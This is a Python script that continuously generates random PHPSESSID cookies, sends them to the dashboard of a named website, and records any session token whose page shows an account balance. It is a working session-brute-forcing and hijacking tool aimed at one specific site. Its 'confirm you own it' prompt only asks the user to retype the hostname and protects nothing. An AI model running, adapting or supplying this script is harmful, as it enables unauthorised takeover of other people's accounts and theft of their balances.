#!/usr/bin/env python3
"""
Auto PHPSESSID generator + checker
- Generates random tokens continuously
- Checks target site for balance snippet
- Saves hits to hits.txt
"""

import requests
import random
import string
import time
from urllib.parse import urlparse

# === CONFIG ===
URL = "https://www.harikiproject.site/dashboard.php"
HITS_FILE = "hits.txt"
TARGET_LEFT = '<div class="stat-value">'
TARGET_RIGHT = '</div>'
TOKEN_LENGTH = 26
RATE_SLEEP = 2  # seconds between requests
USER_AGENT = "auto-session-generator/1.0"

# Interactive confirmation
parsed = urlparse(URL)
host = parsed.hostname or ""
if not host:
    print("Invalid URL in script. Exiting.")
    exit()

print("Target URL:", URL)
confirm = input(f"Type the exact hostname to confirm you own/control it (--> {host}): ").strip()
if confirm != host:
    print("Confirmation did not match. Aborting.")
    exit()

print(f"Starting generator & checker for {host} ...\n")

def generate_token(length=TOKEN_LENGTH):
    alphabet = string.ascii_lowercase + string.digits
    return ''.join(random.choice(alphabet) for _ in range(length))

def extract_balance(html):
    try:
        start = html.index(TARGET_LEFT) + len(TARGET_LEFT)
        end = html.index(TARGET_RIGHT, start)
        return html[start:end].strip()
    except ValueError:
        return None

session = requests.Session()
session.headers.update({"User-Agent": USER_AGENT})

while True:
    token = generate_token()
    cookies = {"PHPSESSID": token}
    try:
        resp = session.get(URL, cookies=cookies, timeout=10, allow_redirects=True)
        if resp.status_code == 200:
            balance = extract_balance(resp.text)
            if balance:
                print(f"[HIT] Token={token} Balance={balance}")
                with open(HITS_FILE, "a", encoding="utf-8") as f:
                    f.write(f"{token} = {balance}\n")
            else:
                print(f"[MISS] Token={token}")
        else:
            print(f"[ERR] Token={token} Status={resp.status_code}")
    except requests.RequestException as e:
        print(f"[EXCEPTION] Token={token} Error={e}")
    time.sleep(RATE_SLEEP)
